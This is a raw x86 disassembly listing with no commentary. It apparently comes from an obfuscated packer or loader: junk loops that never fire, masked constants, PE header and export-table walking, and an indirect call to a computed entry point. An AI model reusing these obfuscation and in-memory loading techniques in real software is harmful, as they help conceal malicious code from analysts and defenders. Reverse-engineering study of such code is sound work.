  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42eeac,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42eeac,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42eeac,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ec38
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42eeac
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42eeac,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e7ea
  409527:	or     edi,DWORD PTR ds:0x4305be
  40952d:	mov    DWORD PTR ds:0x42e7ea,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x430522,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43051a
  40955e:	sbb    DWORD PTR ds:0x42ee8c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42eea4,0x19
  409570:	cmp    DWORD PTR ds:0x42eea4,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42eea4,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eb38
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42eea4
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42eea4,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e7de,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e7de
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e7de,edi
  4095f1:	cmp    DWORD PTR ds:0x42e7de,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e7de,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ec3c
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e7e2,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x430522
  409649:	sub    DWORD PTR ds:0x43050a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42eeac,0x430522
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x43052a,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e7ee,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e7de,0x1f
  409686:	cmp    DWORD PTR ds:0x42e7de,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e7de,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42eb54
  4096b3:	cmp    DWORD PTR ds:0x42e7de,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e7de
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e7de,eax
  4096cb:	mov    eax,ds:0x42e7de
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e7de,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42eea4,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42eea4
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42eea4,ecx
  4096f7:	cmp    DWORD PTR ds:0x42eea4,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42eea4,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430512
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ec40
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43050a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee94,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee94,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee94,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42eeac
  409763:	call   DWORD PTR ds:0x42ec44
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee94
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee94,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x43052e,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x4305ce,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee98
  4097a8:	sub    DWORD PTR ds:0x42e7e2,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x4305c6
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e7da,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e7da
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e7da,edx
  4097d5:	cmp    DWORD PTR ds:0x42e7da,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x4305d6
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42eb58
  4097f0:	cmp    DWORD PTR ds:0x42e7da,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e7da
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e7da,edx
  40980a:	cmp    DWORD PTR ds:0x42e7da,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x4305c2,0x1c
  40982b:	cmp    DWORD PTR ds:0x4305c2,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x4305c2,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ec48
  409850:	cmp    DWORD PTR ds:0x4305c2,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x4305c2
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x4305c2,edx
  40986a:	mov    edx,DWORD PTR ds:0x4305c2
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x4305c2,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee94,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x4305ca,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x430522,0x42e7f2
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x43053a,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x43053a
  4098b7:	inc    eax
  4098b8:	mov    ds:0x43053a,eax
  4098bd:	cmp    DWORD PTR ds:0x43053a,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x43053a,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ec4c
  4098eb:	cmp    DWORD PTR ds:0x43053a,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x43053a
  4098fd:	inc    eax
  4098fe:	mov    ds:0x43053a,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x430542,0x430526
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee9c,0x42e7ee
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee94,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee94
  409945:	inc    eax
  409946:	mov    ds:0x42ee94,eax
  40994b:	cmp    DWORD PTR ds:0x42ee94,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee94,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eb60
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43051e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e7de,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x430542
  409998:	xor    ecx,DWORD PTR ds:0x43053e
  40999e:	mov    DWORD PTR ds:0x430542,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x430536,0x42ee94
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e7ea,0x42ee88
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x43053a,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x430532,0x430542
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e7de,0x42e7ea
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e7f2,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x4305c6,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e7da,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430506,0x4305d2
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e7de
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x4305da,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e7ee,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e7ee,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee90,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43051a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e7de,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x4305ce,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x43053e,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x4305da,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x4305ca,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x4305d2,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee8c,0x42e7de
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x43053a
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee8c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x4305c6,0x42eea8
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e7ea,0x43051a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x43052a,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e7de,0x4305ce
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x430542
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42eea8,0x430516
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42eea4,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430506,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430516
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x430522,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43050e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x43053a,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x430522,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e7f6,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x43053e,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x4305c2,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x4305c6,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x4305c6,0x42ee8c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
